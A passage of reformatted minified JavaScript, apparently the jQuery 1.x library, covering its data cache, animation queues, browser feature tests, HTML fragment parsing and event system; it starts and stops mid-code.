                  ? f.parseJSON(n)
                  : n));
          } catch (t) {}
          f.data(t, e, n);
        } else n = void 0;
      }
      return n;
    }
    function $(t) {
      var e;
      for (e in t)
        if (("data" !== e || !f.isEmptyObject(t[e])) && "toJSON" !== e)
          return !1;
      return !0;
    }
    function R(t, e, i, o) {
      if (M(t)) {
        var r,
          s,
          a = f.expando,
          l = t.nodeType,
          c = l ? f.cache : t,
          u = l ? t[a] : t[a] && a;
        if (
          (u && c[u] && (o || c[u].data)) ||
          void 0 !== i ||
          "string" != typeof e
        )
          return (
            u || (u = l ? (t[a] = n.pop() || f.guid++) : a),
            c[u] || (c[u] = l ? {} : { toJSON: f.noop }),
            ("object" != typeof e && "function" != typeof e) ||
              (o
                ? (c[u] = f.extend(c[u], e))
                : (c[u].data = f.extend(c[u].data, e))),
            (s = c[u]),
            o || (s.data || (s.data = {}), (s = s.data)),
            void 0 !== i && (s[f.camelCase(e)] = i),
            "string" == typeof e
              ? null == (r = s[e]) && (r = s[f.camelCase(e)])
              : (r = s),
            r
          );
      }
    }
    function W(t, e, n) {
      if (M(t)) {
        var i,
          o,
          r = t.nodeType,
          s = r ? f.cache : t,
          a = r ? t[f.expando] : f.expando;
        if (s[a]) {
          if (e && (i = n ? s[a] : s[a].data)) {
            f.isArray(e)
              ? (e = e.concat(f.map(e, f.camelCase)))
              : e in i
              ? (e = [e])
              : (e = (e = f.camelCase(e)) in i ? [e] : e.split(" ")),
              (o = e.length);
            for (; o--; ) delete i[e[o]];
            if (n ? !$(i) : !f.isEmptyObject(i)) return;
          }
          (n || (delete s[a].data, $(s[a]))) &&
            (r
              ? f.cleanData([t], !0)
              : d.deleteExpando || s != s.window
              ? delete s[a]
              : (s[a] = void 0));
        }
      }
    }
    f.extend({
      cache: {},
      noData: {
        "applet ": !0,
        "embed ": !0,
        "object ": "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",
      },
      hasData: function (t) {
        return (
          !!(t = t.nodeType ? f.cache[t[f.expando]] : t[f.expando]) && !$(t)
        );
      },
      data: function (t, e, n) {
        return R(t, e, n);
      },
      removeData: function (t, e) {
        return W(t, e);
      },
      _data: function (t, e, n) {
        return R(t, e, n, !0);
      },
      _removeData: function (t, e) {
        return W(t, e, !0);
      },
    }),
      f.fn.extend({
        data: function (t, e) {
          var n,
            i,
            o,
            r = this[0],
            s = r && r.attributes;
          if (void 0 === t) {
            if (
              this.length &&
              ((o = f.data(r)), 1 === r.nodeType && !f._data(r, "parsedAttrs"))
            ) {
              for (n = s.length; n--; )
                s[n] &&
                  0 === (i = s[n].name).indexOf("data-") &&
                  I(r, (i = f.camelCase(i.slice(5))), o[i]);
              f._data(r, "parsedAttrs", !0);
            }
            return o;
          }
          return "object" == typeof t
            ? this.each(function () {
                f.data(this, t);
              })
            : arguments.length > 1
            ? this.each(function () {
                f.data(this, t, e);
              })
            : r
            ? I(r, t, f.data(r, t))
            : void 0;
        },
        removeData: function (t) {
          return this.each(function () {
            f.removeData(this, t);
          });
        },
      }),
      f.extend({
        queue: function (t, e, n) {
          var i;
          return t
            ? ((e = (e || "fx") + "queue"),
              (i = f._data(t, e)),
              n &&
                (!i || f.isArray(n)
                  ? (i = f._data(t, e, f.makeArray(n)))
                  : i.push(n)),
              i || [])
            : void 0;
        },
        dequeue: function (t, e) {
          e = e || "fx";
          var n = f.queue(t, e),
            i = n.length,
            o = n.shift(),
            r = f._queueHooks(t, e);
          "inprogress" === o && ((o = n.shift()), i--),
            o &&
              ("fx" === e && n.unshift("inprogress"),
              delete r.stop,
              o.call(
                t,
                function () {
                  f.dequeue(t, e);
                },
                r
              )),
            !i && r && r.empty.fire();
        },
        _queueHooks: function (t, e) {
          var n = e + "queueHooks";
          return (
            f._data(t, n) ||
            f._data(t, n, {
              empty: f.Callbacks("once memory").add(function () {
                f._removeData(t, e + "queue"), f._removeData(t, n);
              }),
            })
          );
        },
      }),
      f.fn.extend({
        queue: function (t, e) {
          var n = 2;
          return (
            "string" != typeof t && ((e = t), (t = "fx"), n--),
            arguments.length < n
              ? f.queue(this[0], t)
              : void 0 === e
              ? this
              : this.each(function () {
                  var n = f.queue(this, t, e);
                  f._queueHooks(this, t),
                    "fx" === t && "inprogress" !== n[0] && f.dequeue(this, t);
                })
          );
        },
        dequeue: function (t) {
          return this.each(function () {
            f.dequeue(this, t);
          });
        },
        clearQueue: function (t) {
          return this.queue(t || "fx", []);
        },
        promise: function (t, e) {
          var n,
            i = 1,
            o = f.Deferred(),
            r = this,
            s = this.length,
            a = function () {
              --i || o.resolveWith(r, [r]);
            };
          for (
            "string" != typeof t && ((e = t), (t = void 0)), t = t || "fx";
            s--;

          )
            (n = f._data(r[s], t + "queueHooks")) &&
              n.empty &&
              (i++, n.empty.add(a));
          return a(), o.promise(e);
        },
      }),
      (function () {
        var t;
        d.shrinkWrapBlocks = function () {
          return null != t
            ? t
            : ((t = !1),
              (n = i.getElementsByTagName("body")[0]) && n.style
                ? ((e = i.createElement("div")),
                  ((o = i.createElement("div")).style.cssText =
                    "position:absolute;border:0;width:0;height:0;top:0;left:-9999px"),
                  n.appendChild(o).appendChild(e),
                  void 0 !== e.style.zoom &&
                    ((e.style.cssText =
                      "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1"),
                    (e.appendChild(i.createElement("div")).style.width = "5px"),
                    (t = 3 !== e.offsetWidth)),
                  n.removeChild(o),
                  t)
                : void 0);
          var e, n, o;
        };
      })();
    var q = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
      F = new RegExp("^(?:([+-])=|)(" + q + ")([a-z%]*)$", "i"),
      U = ["Top", "Right", "Bottom", "Left"],
      X = function (t, e) {
        return (
          (t = e || t),
          "none" === f.css(t, "display") || !f.contains(t.ownerDocument, t)
        );
      };
    function V(t, e, n, i) {
      var o,
        r = 1,
        s = 20,
        a = i
          ? function () {
              return i.cur();
            }
          : function () {
              return f.css(t, e, "");
            },
        l = a(),
        c = (n && n[3]) || (f.cssNumber[e] ? "" : "px"),
        u = (f.cssNumber[e] || ("px" !== c && +l)) && F.exec(f.css(t, e));
      if (u && u[3] !== c) {
        (c = c || u[3]), (n = n || []), (u = +l || 1);
        do {
          (u /= r = r || ".5"), f.style(t, e, u + c);
        } while (r !== (r = a() / l) && 1 !== r && --s);
      }
      return (
        n &&
          ((u = +u || +l || 0),
          (o = n[1] ? u + (n[1] + 1) * n[2] : +n[2]),
          i && ((i.unit = c), (i.start = u), (i.end = o))),
        o
      );
    }
    var Y = function (t, e, n, i, o, r, s) {
        var a = 0,
          l = t.length,
          c = null == n;
        if ("object" === f.type(n))
          for (a in ((o = !0), n)) Y(t, e, a, n[a], !0, r, s);
        else if (
          void 0 !== i &&
          ((o = !0),
          f.isFunction(i) || (s = !0),
          c &&
            (s
              ? (e.call(t, i), (e = null))
              : ((c = e),
                (e = function (t, e, n) {
                  return c.call(f(t), n);
                }))),
          e)
        )
          for (; l > a; a++) e(t[a], n, s ? i : i.call(t[a], a, e(t[a], n)));
        return o ? t : c ? e.call(t) : l ? e(t[0], n) : r;
      },
      K = /^(?:checkbox|radio)$/i,
      Q = /<([\w:-]+)/,
      G = /^$|\/(?:java|ecma)script/i,
      Z = /^\s+/,
      J =
        "abbr|article|aside|audio|bdi|canvas|data|datalist|details|dialog|figcaption|figure|footer|header|hgroup|main|mark|meter|nav|output|picture|progress|section|summary|template|time|video";
    function tt(t) {
      var e = J.split("|"),
        n = t.createDocumentFragment();
      if (n.createElement) for (; e.length; ) n.createElement(e.pop());
      return n;
    }
    !(function () {
      var t = i.createElement("div"),
        e = i.createDocumentFragment(),
        n = i.createElement("input");
      (t.innerHTML =
        "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>"),
        (d.leadingWhitespace = 3 === t.firstChild.nodeType),
        (d.tbody = !t.getElementsByTagName("tbody").length),
        (d.htmlSerialize = !!t.getElementsByTagName("link").length),
        (d.html5Clone =
          "<:nav></:nav>" !== i.createElement("nav").cloneNode(!0).outerHTML),
        (n.type = "checkbox"),
        (n.checked = !0),
        e.appendChild(n),
        (d.appendChecked = n.checked),
        (t.innerHTML = "<textarea>x</textarea>"),
        (d.noCloneChecked = !!t.cloneNode(!0).lastChild.defaultValue),
        e.appendChild(t),
        (n = i.createElement("input")).setAttribute("type", "radio"),
        n.setAttribute("checked", "checked"),
        n.setAttribute("name", "t"),
        t.appendChild(n),
        (d.checkClone = t.cloneNode(!0).cloneNode(!0).lastChild.checked),
        (d.noCloneEvent = !!t.addEventListener),
        (t[f.expando] = 1),
        (d.attributes = !t.getAttribute(f.expando));
    })();
    var et = {
      option: [1, "<select multiple='multiple'>", "</select>"],
      legend: [1, "<fieldset>", "</fieldset>"],
      area: [1, "<map>", "</map>"],
      param: [1, "<object>", "</object>"],
      thead: [1, "<table>", "</table>"],
      tr: [2, "<table><tbody>", "</tbody></table>"],
      col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
      td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
      _default: d.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"],
    };
    function nt(t, e) {
      var n,
        i,
        o = 0,
        r =
          void 0 !== t.getElementsByTagName
            ? t.getElementsByTagName(e || "*")
            : void 0 !== t.querySelectorAll
            ? t.querySelectorAll(e || "*")
            : void 0;
      if (!r)
        for (r = [], n = t.childNodes || t; null != (i = n[o]); o++)
          !e || f.nodeName(i, e) ? r.push(i) : f.merge(r, nt(i, e));
      return void 0 === e || (e && f.nodeName(t, e)) ? f.merge([t], r) : r;
    }
    function it(t, e) {
      for (var n, i = 0; null != (n = t[i]); i++)
        f._data(n, "globalEval", !e || f._data(e[i], "globalEval"));
    }
    (et.optgroup = et.option),
      (et.tbody = et.tfoot = et.colgroup = et.caption = et.thead),
      (et.th = et.td);
    var ot = /<|&#?\w+;/,
      rt = /<tbody/i;
    function st(t) {
      K.test(t.type) && (t.defaultChecked = t.checked);
    }
    function at(t, e, n, i, o) {
      for (
        var r, s, a, l, c, u, h, p = t.length, g = tt(e), m = [], v = 0;
        p > v;
        v++
      )
        if ((s = t[v]) || 0 === s)
          if ("object" === f.type(s)) f.merge(m, s.nodeType ? [s] : s);
          else if (ot.test(s)) {
            for (
              l = l || g.appendChild(e.createElement("div")),
                c = (Q.exec(s) || ["", ""])[1].toLowerCase(),
                h = et[c] || et._default,
                l.innerHTML = h[1] + f.htmlPrefilter(s) + h[2],
                r = h[0];
              r--;

            )
              l = l.lastChild;
            if (
              (!d.leadingWhitespace &&
                Z.test(s) &&
                m.push(e.createTextNode(Z.exec(s)[0])),
              !d.tbody)
            )
              for (
                r =
                  (s =
                    "table" !== c || rt.test(s)
                      ? "<table>" !== h[1] || rt.test(s)
                        ? 0
                        : l
                      : l.firstChild) && s.childNodes.length;
                r--;

              )
                f.nodeName((u = s.childNodes[r]), "tbody") &&
                  !u.childNodes.length &&
                  s.removeChild(u);
            for (f.merge(m, l.childNodes), l.textContent = ""; l.firstChild; )
              l.removeChild(l.firstChild);
            l = g.lastChild;
          } else m.push(e.createTextNode(s));
      for (
        l && g.removeChild(l),
          d.appendChecked || f.grep(nt(m, "input"), st),
          v = 0;
        (s = m[v++]);

      )
        if (i && f.inArray(s, i) > -1) o && o.push(s);
        else if (
          ((a = f.contains(s.ownerDocument, s)),
          (l = nt(g.appendChild(s), "script")),
          a && it(l),
          n)
        )
          for (r = 0; (s = l[r++]); ) G.test(s.type || "") && n.push(s);
      return (l = null), g;
    }
    !(function () {
      var e,
        n,
        o = i.createElement("div");
      for (e in { submit: !0, change: !0, focusin: !0 })
        (n = "on" + e),
          (d[e] = n in t) ||
            (o.setAttribute(n, "t"), (d[e] = !1 === o.attributes[n].expando));
      o = null;
    })();
    var lt = /^(?:input|select|textarea)$/i,
      ct = /^key/,
      ut = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
      dt = /^(?:focusinfocus|focusoutblur)$/,
      ht = /^([^.]*)(?:\.(.+)|)/;
    function ft() {
      return !0;
    }
    function pt() {
      return !1;
    }
    function gt() {
      try {
        return i.activeElement;
      } catch (t) {}
    }
    function mt(t, e, n, i, o, r) {
      var s, a;
      if ("object" == typeof e) {
        for (a in ("string" != typeof n && ((i = i || n), (n = void 0)), e))
          mt(t, a, n, i, e[a], r);
        return t;
      }
      if (
        (null == i && null == o
          ? ((o = n), (i = n = void 0))
          : null == o &&
            ("string" == typeof n
              ? ((o = i), (i = void 0))
              : ((o = i), (i = n), (n = void 0))),
        !1 === o)
      )
        o = pt;
      else if (!o) return t;
      return (
        1 === r &&
          ((s = o),
          ((o = function (t) {
            return f().off(t), s.apply(this, arguments);
          }).guid = s.guid || (s.guid = f.guid++))),
        t.each(function () {
          f.event.add(this, e, o, i, n);
        })
      );
    }
    (f.event = {
      global: {},
      add: function (t, e, n, i, o) {
        var r,
          s,
          a,
          l,
          c,
          u,
          d,
          h,
          p,
          g,
          m,
          v = f._data(t);
        if (v) {
          for (
            n.handler && ((n = (l = n).handler), (o = l.selector)),
              n.guid || (n.guid = f.guid++),
              (s = v.events) || (s = v.events = {}),
              (u = v.handle) ||
                ((u = v.handle =
                  function (t) {
                    return void 0 === f || (t && f.event.triggered === t.type)
                      ? void 0
                      : f.event.dispatch.apply(u.elem, arguments);
                  }).elem = t),
              a = (e = (e || "").match(j) || [""]).length;
            a--;

          )
            (p = m = (r = ht.exec(e[a]) || [])[1]),
              (g = (r[2] || "").split(".").sort()),
              p &&
                ((c = f.event.special[p] || {}),
                (p = (o ? c.delegateType : c.bindType) || p),
                (c = f.event.special[p] || {}),
                (d = f.extend(
                  {
                    type: p,
                    origType: m,
                    data: i,
                    handler: n,
                    guid: n.guid,
                    selector: o,
                    needsContext: o && f.expr.match.needsContext.test(o),
                    namespace: g.join("."),
                  },
                  l
                )),
                (h = s[p]) ||
                  (((h = s[p] = []).delegateCount = 0),
                  (c.setup && !1 !== c.setup.call(t, i, g, u)) ||
                    (t.addEventListener
                      ? t.addEventListener(p, u, !1)
                      : t.attachEvent && t.attachEvent("on" + p, u))),
                c.add &&
                  (c.add.call(t, d),
                  d.handler.guid || (d.handler.guid = n.guid)),
                o ? h.splice(h.delegateCount++, 0, d) : h.push(d),
                (f.event.global[p] = !0));
          t = null;
        }
      },
      remove: function (t, e, n, i, o) {
        var r,
          s,
          a,
          l,
          c,
          u,
          d,
          h,
          p,
          g,
          m,
          v = f.hasData(t) && f._data(t);
        if (v && (u = v.events)) {
          for (c = (e = (e || "").match(j) || [""]).length; c--; )
            if (
              ((p = m = (a = ht.exec(e[c]) || [])[1]),
              (g = (a[2] || "").split(".").sort()),
              p)
            ) {
              for (
                d = f.event.special[p] || {},
                  h = u[(p = (i ? d.delegateType : d.bindType) || p)] || [],
                  a =
                    a[2] &&
                    new RegExp("(^|\\.)" + g.join("\\.(?:.*\\.|)") + "(\\.|$)"),
                  l = r = h.length;
                r--;

              )
                (s = h[r]),
                  (!o && m !== s.origType) ||
                    (n && n.guid !== s.guid) ||
                    (a && !a.test(s.namespace)) ||
                    (i && i !== s.selector && ("**" !== i || !s.selector)) ||
                    (h.splice(r, 1),
                    s.selector && h.delegateCount--,
                    d.remove && d.remove.call(t, s));
              l &&
                !h.length &&
                ((d.teardown && !1 !== d.teardown.call(t, g, v.handle)) ||
                  f.removeEvent(t, p, v.handle),
                delete u[p]);
            } else for (p in u) f.event.remove(t, p + e[c], n, i, !0);
          f.isEmptyObject(u) && (delete v.handle, f._removeData(t, "events"));
        }
      },
      trigger: function (e, n, o, r) {
        var s,
          a,
          l,
          c,
          d,
          h,
          p,
          g = [o || i],
          m = u.call(e, "type") ? e.type : e,
          v = u.call(e, "namespace") ? e.namespace.split(".") : [];
        if (
          ((l = h = o = o || i),
          3 !== o.nodeType &&
            8 !== o.nodeType &&
            !dt.test(m + f.event.triggered) &&
            (m.indexOf(".") > -1 &&
              ((v = m.split(".")), (m = v.shift()), v.sort()),
            (a = m.indexOf(":") < 0 && "on" + m),
            ((e = e[f.expando]
              ? e
              : new f.Event(m, "object" == typeof e && e)).isTrigger = r
              ? 2
              : 3),
            (e.namespace = v.join(".")),
            (e.rnamespace = e.namespace
              ? new RegExp("(^|\\.)" + v.join("\\.(?:.*\\.|)") + "(\\.|$)")
              : null),
            (e.result = void 0),
            e.target || (e.target = o),
            (n = null == n ? [e] : f.makeArray(n, [e])),
            (d = f.event.special[m] || {}),
            r || !d.trigger || !1 !== d.trigger.apply(o, n)))
        ) {
          if (!r && !d.noBubble && !f.isWindow(o)) {
            for (
              c = d.delegateType || m, dt.test(c + m) || (l = l.parentNode);
              l;
              l = l.parentNode
            )
              g.push(l), (h = l);
            h === (o.ownerDocument || i) &&
              g.push(h.defaultView || h.parentWindow || t);
          }
          for (p = 0; (l = g[p++]) && !e.isPropagationStopped(); )
            (e.type = p > 1 ? c : d.bindType || m),
              (s =
                (f._data(l, "events") || {})[e.type] && f._data(l, "handle")) &&
                s.apply(l, n),
              (s = a && l[a]) &&
                s.apply &&
                M(l) &&
                ((e.result = s.apply(l, n)),
                !1 === e.result && e.preventDefault());
          if (
            ((e.type = m),
            !r &&
              !e.isDefaultPrevented() &&
              (!d._default || !1 === d._default.apply(g.pop(), n)) &&
              M(o) &&
              a &&
              o[m] &&
              !f.isWindow(o))
          ) {
            (h = o[a]) && (o[a] = null), (f.event.triggered = m);
            try {
              o[m]();
            } catch (t) {}
            (f.event.triggered = void 0), h && (o[a] = h);
          }
          return e.result;
        }
      },
      dispatch: function (t) {
        t = f.event.fix(t);
        var e,
          n,
          i,
          r,
          s,
          a = [],
          l = o.call(arguments),
          c = (f._data(this, "events") || {})[t.type] || [],
          u = f.event.special[t.type] || {};
        if (
          ((l[0] = t),
          (t.delegateTarget = this),
          !u.preDispatch || !1 !== u.preDispatch.call(this, t))
        ) {
          for (
            a = f.event.handlers.call(this, t, c), e = 0;
            (r = a[e++]) && !t.isPropagationStopped();

          )
            for (
              t.currentTarget = r.elem, n = 0;
              (s = r.handlers[n++]) && !t.isImmediatePropagationStopped();

            )
              (t.rnamespace && !t.rnamespace.test(s.namespace)) ||
                ((t.handleObj = s),
                (t.data = s.data),
                void 0 !==
                  (i = (
                    (f.event.special[s.origType] || {}).handle || s.handler
                  ).apply(r.elem, l)) &&
                  !1 === (t.result = i) &&
                  (t.preventDefault(), t.stopPropagation()));
          return u.postDispatch && u.postDispatch.call(this, t), t.result;
        }
      },
      handlers: function (t, e) {
        var n,
          i,
          o,
          r,
          s = [],
          a = e.delegateCount,
          l = t.target;
        if (
          a &&
          l.nodeType &&
          ("click" !== t.type || isNaN(t.button) || t.button < 1)
        )
          for (; l != this; l = l.parentNode || this)
            if (1 === l.nodeType && (!0 !== l.disabled || "click" !== t.type)) {
              for (i = [], n = 0; a > n; n++)
                void 0 === i[(o = (r = e[n]).selector + " ")] &&
                  (i[o] = r.needsContext
                    ? f(o, this).index(l) > -1
                    : f.find(o, this, null, [l]).length),
                  i[o] && i.push(r);
              i.length && s.push({ elem: l, handlers: i });
            }
        return a < e.length && s.push({ elem: this, handlers: e.slice(a) }), s;
      },
      fix: function (t) {
        if (t[f.expando]) return t;
        var e,
          n,
          o,
          r = t.type,
          s = t,
          a = this.fixHooks[r];
        for (
          a ||
            (this.fixHooks[r] = a =
              ut.test(r) ? this.mouseHooks : ct.test(r) ? this.keyHooks : {}),
            o = a.props ? this.props.concat(a.props) : this.props,
            t = new f.Event(s),
            e = o.length;
          e--;

        )
          t[(n = o[e])] = s[n];
        return (
          t.target || (t.target = s.srcElement || i),
          3 === t.target.nodeType && (t.target = t.target.parentNode),
          (t.metaKey = !!t.metaKey),
          a.filter ? a.filter(t, s) : t
        );
      },
      props:
        "altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(
          " "
        ),
      fixHooks: {},
      keyHooks: {
        props: "char charCode key keyCode".split(" "),
        filter: function (t, e) {
          return (
            null == t.which &&
              (t.which = null != e.charCode ? e.charCode : e.keyCode),
            t
          );
        },
      },
      mouseHooks: {
        props:
          "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(
            " "
          ),
        filter: function (t, e) {
          var n,
            o,
            r,
            s = e.button,
            a = e.fromElement;
          return (
            null == t.pageX &&
              null != e.clientX &&
              ((r = (o = t.target.ownerDocument || i).documentElement),
              (n = o.body),
              (t.pageX =
                e.clientX +
                ((r && r.scrollLeft) || (n && n.scrollLeft) || 0) -
                ((r && r.clientLeft) || (n && n.clientLeft) || 0)),
              (t.pageY =
                e.clientY +
                ((r && r.scrollTop) || (n && n.scrollTop) || 0) -
                ((r && r.clientTop) || (n && n.clientTop) || 0))),
            !t.relatedTarget &&
              a &&
              (t.relatedTarget = a === t.target ? e.toElement : a),
            t.which ||
              void 0 === s ||
              (t.which = 1 & s ? 1 : 2 & s ? 3 : 4 & s ? 2 : 0),
            t
          );
        },
      },
      special: {
        load: { noBubble: !0 },
        focus: {
          trigger: function () {
            if (this !== gt() && this.focus)
              try {
                return this.focus(), !1;
              } catch (t) {}
          },
          delegateType: "focusin",
        },
        blur: {
          trigger: function () {
            return this === gt() && this.blur ? (this.blur(), !1) : void 0;
          },
          delegateType: "focusout",
        },
        click: {
          trigger: function () {
            return f.nodeName(this, "input") &&
              "checkbox" === this.type &&
              this.click
              ? (this.click(), !1)
              : void 0;
          },
          _default: function (t) {
            return f.nodeName(t.target, "a");
          },
        },
        beforeunload: {
          postDispatch: function (t) {
            void 0 !== t.result &&
              t.originalEvent &&
              (t.originalEvent.returnValue = t.result);
          },
        },
      },
      simulate: function (t, e, n) {
        var i = f.extend(new f.Event(), n, { type: t, isSimulated: !0 });
        f.event.trigger(i, null, e),
          i.isDefaultPrevented() && n.preventDefault();
      },
    }),
      (f.removeEvent = i.removeEventListener
        ? function (t, e, n) {
            t.removeEventListener && t.removeEventListener(e, n);
          }
        : function (t, e, n) {
            var i = "on" + e;
            t.detachEvent &&
              (void 0 === t[i] && (t[i] = null), t.detachEvent(i, n));
          }),
      (f.Event = function (t, e) {
        return this instanceof f.Event
          ? (t && t.type
              ? ((this.originalEvent = t),
                (this.type = t.type),
                (this.isDefaultPrevented =
                  t.defaultPrevented ||
                  (void 0 === t.defaultPrevented && !1 === t.returnValue)
                    ? ft
                    : pt))
              : (this.type = t),
            e && f.extend(this, e),
            (this.timeStamp = (t && t.timeStamp) || f.now()),
            void (this[f.expando] = !0))
          : new f.Event(t, e);
      }),
      (f.Event.prototype = {
        constructor: f.Event,
        isDefaultPrevented: pt,
        isPropagationStopped: pt,
        isImmediatePropagationStopped: pt,
        preventDefault: function () {
          var t = this.originalEvent;
          (this.isDefaultPrevented = ft),
            t && (t.preventDefault ? t.preventDefault() : (t.returnValue = !1));
        },
        stopPropagation: function () {
          var t = this.originalEvent;
          (this.isPropagationStopped = ft),
            t &&
              !this.isSimulated &&
              (t.stopPropagation && t.stopPropagation(), (t.cancelBubble = !0));
        },
        stopImmediatePropagation: function () {
          var t = this.originalEvent;
          (this.isImmediatePropagationStopped = ft),
            t && t.stopImmediatePropagation && t.stopImmediatePropagation(),
            this.stopPropagation();
        },
      }),
      f.each(
        {
          mouseenter: "mouseover",
          mouseleave: "mouseout",
          pointerenter: "pointerover",
          pointerleave: "pointerout",
        },
        function (t, e) {
          f.event.special[t] = {
            delegateType: e,
            bindType: e,
            handle: function (t) {
              var n,
                i = this,
                o = t.relatedTarget,
                r = t.handleObj;
              return (
                (o && (o === i || f.contains(i, o))) ||
                  ((t.type = r.origType),
                  (n = r.handler.apply(this, arguments)),
                  (t.type = e)),
                n
              );
            },
          };
        }
      ),
      d.submit ||
        (f.event.special.submit = {
          setup: function () {
            return (
              !f.nodeName(this, "form") &&
              void f.event.add(
                this,
                "click._submit keypress._submit",
                function (t) {
                  var e = t.target,
                    n =
                      f.nodeName(e, "input") || f.nodeName(e, "button")
                        ? f.prop(e, "form")
                        : void 0;
                  n &&
                    !f._data(n, "submit") &&
                    (f.event.add(n, "submit._submit", function (t) {
                      t._submitBubble = !0;
                    }),
                    f._data(n, "submit", !0));
                }
              )
            );
          },
          postDispatch: function (t) {
            t._submitBubble &&
              (delete t._submitBubble,
              this.parentNode &&
                !t.isTrigger &&
                f.event.simulate("submit", this.parentNode, t));
          },
          teardown: function () {
            return (
              !f.nodeName(this, "form") && void f.event.remove(this, "._submit")
            );
          },
        }),
      d.change ||
        (f.event.special.change = {
          setup: function () {
            return lt.test(this.nodeName)
              ? (("checkbox" !== this.type && "radio" !== this.type) ||
                  (f.event.add(this, "propertychange._change", function (t) {
                    "checked" === t.originalEvent.propertyName &&
                      (this._justChanged = !0);
                  }),
                  f.event.add(this, "click._change", function (t) {
                    this._justChanged &&
                      !t.isTrigger &&
                      (this._justChanged = !1),
                      f.event.simulate("change", this, t);
                  })),
                !1)
              : void f.event.add(this, "beforeactivate._change", function (t) {
                  var e = t.target;
                  lt.test(e.nodeName) &&
                    !f._data(e, "change") &&
                    (f.event.add(e, "change._change", function (t) {
                      !this.parentNode ||
                        t.isSimulated ||
                        t.isTrigger ||
                        f.event.simulate("change", this.parentNode, t);
                    }),
                    f._data(e, "change", !0));
                });
          },
          handle: function (t) {
            var e = t.target;
            return this !== e ||
              t.isSimulated ||
              t.isTrigger ||
              ("radio" !== e.type && "checkbox" !== e.type)
              ? t.handleObj.handler.apply(this, arguments)
              : void 0;
          },
          teardown: function () {
            return f.event.remove(this, "._change"), !lt.test(this.nodeName);
          },
        }),
      d.focusin ||
        f.each({ focus: "focusin", blur: "focusout" }, function (t, e) {
          var n = function (t) {
            f.event.simulate(e, t.target, f.event.fix(t));
          };
          f.event.special[e] = {
            setup: function () {
              var i = this.ownerDocument || this,
                o = f._data(i, e);
              o || i.addEventListener(t, n, !0), f._data(i, e, (o || 0) + 1);
            },
            teardown: function () {
              var i = this.ownerDocument || this,
                o = f._data(i, e) - 1;
              o
                ? f._data(i, e, o)
                : (i.removeEventListener(t, n, !0), f._removeData(i, e));
            },
          };
        }),
      f.fn.extend({
        on: function (t, e, n, i) {
          return mt(this, t, e, n, i);
        },
        one: function (t, e, n, i) {
          return mt(this, t, e, n, i, 1);
        },
        off: function (t, e, n) {
          var i, o;
          if (t && t.preventDefault && t.handleObj)
            return (
              (i = t.handleObj),
              f(t.delegateTarget).off(
                i.namespace ? i.origType + "." + i.namespace : i.origType,
                i.selector,
                i.handler
              ),
              this
            );
          if ("object" == typeof t) {
            for (o in t) this.off(o, e, t[o]);
            return this;
          }
          return (
            (!1 !== e && "function" != typeof e) || ((n = e), (e = void 0)),
            !1 === n && (n = pt),
            this.each(function () {
              f.event.remove(this, t, n, e);
            })
          );
        },
        trigger: function (t, e) {
          return this.each(function () {
            f.event.trigger(t, e, this);
          });
        },
        triggerHandler: function (t, e) {
          var n = this[0];
          return n ? f.event.trigger(t, e, n, !0) : void 0;
        },
      });
    var vt = / jQuery\d+="(?:null|\d+)"/g,
      yt = new RegExp("<(?:" + J + ")[\\s/>]", "i"),
      bt =
        /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi,
      _t = /<script|<style|<link/i,
      wt = /checked\s*(?:[^=]|=\s*.checked.)/i,
      xt = /^true\/(.*)/,
      Et = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
      Tt = tt(i).appendChild(i.createElement("div"));
    function Ct(t, e) {
      return f.nodeName(t, "table") &&
        f.nodeName(11 !== e.nodeType ? e : e.firstChild, "tr")
        ? t.getElementsByTagName("tbody")[0] ||
            t.appendChild(t.ownerDocument.createElement("tbody"))
        : t;
    }
    function At(t) {
      return (t.type = (null !== f.find.attr(t, "type")) + "/" + t.type), t;
    }
    function kt(t) {
      var e = xt.exec(t.type);
      return e ? (t.type = e[1]) : t.removeAttribute("type"), t;
    }
    function St(t, e) {
      if (1 === e.nodeType && f.hasData(t)) {
        var n,
          i,
          o,
          r = f._data(t),
          s = f._data(e, r),
          a = r.events;
        if (a)
          for (n in (delete s.handle, (s.events = {}), a))
            for (i = 0, o = a[n].length; o > i; i++) f.event.add(e, n, a[n][i]);
        s.data && (s.data = f.extend({}, s.data));
      }
    }
    function Lt(t, e) {
      var n, i, o;
      if (1 === e.nodeType) {
        if (((n = e.nodeName.toLowerCase()), !d.noCloneEvent && e[f.expando])) {
          for (i in (o = f._data(e)).events) f.removeEvent(e, i, o.handle);
          e.removeAttribute(f.expando);
        }
        "script" === n && e.text !== t.text
          ? ((At(e).text = t.text), kt(e))
          : "object" === n
          ? (e.parentNode && (e.outerHTML = t.outerHTML),
            d.html5Clone &&
              t.innerHTML &&
              !f.trim(e.innerHTML) &&
              (e.innerHTML = t.innerHTML))
          : "input" === n && K.test(t.type)
          ? ((e.defaultChecked = e.checked = t.checked),
            e.value !== t.value && (e.value = t.value))
          : "option" === n
          ? (e.defaultSelected = e.selected = t.defaultSelected)
          : ("input" !== n && "textarea" !== n) ||
            (e.defaultValue = t.defaultValue);
      }
    }
    function Dt(t, e, n, i) {
      e = r.apply([], e);
      var o,
        s,
        a,
        l,
        c,
        u,
        h = 0,
        p = t.length,
        g = p - 1,
        m = e[0],
        v = f.isFunction(m);
      if (v || (p > 1 && "string" == typeof m && !d.checkClone && wt.test(m)))
        return t.each(function (o) {
          var r = t.eq(o);
          v && (e[0] = m.call(this, o, r.html())), Dt(r, e, n, i);
        });
      if (
        p &&
        ((o = (u = at(e, t[0].ownerDocument, !1, t, i)).firstChild),
        1 === u.childNodes.length && (u = o),
        o || i)
      ) {
        for (a = (l = f.map(nt(u, "script"), At)).length; p > h; h++)
          (s = u),
            h !== g &&
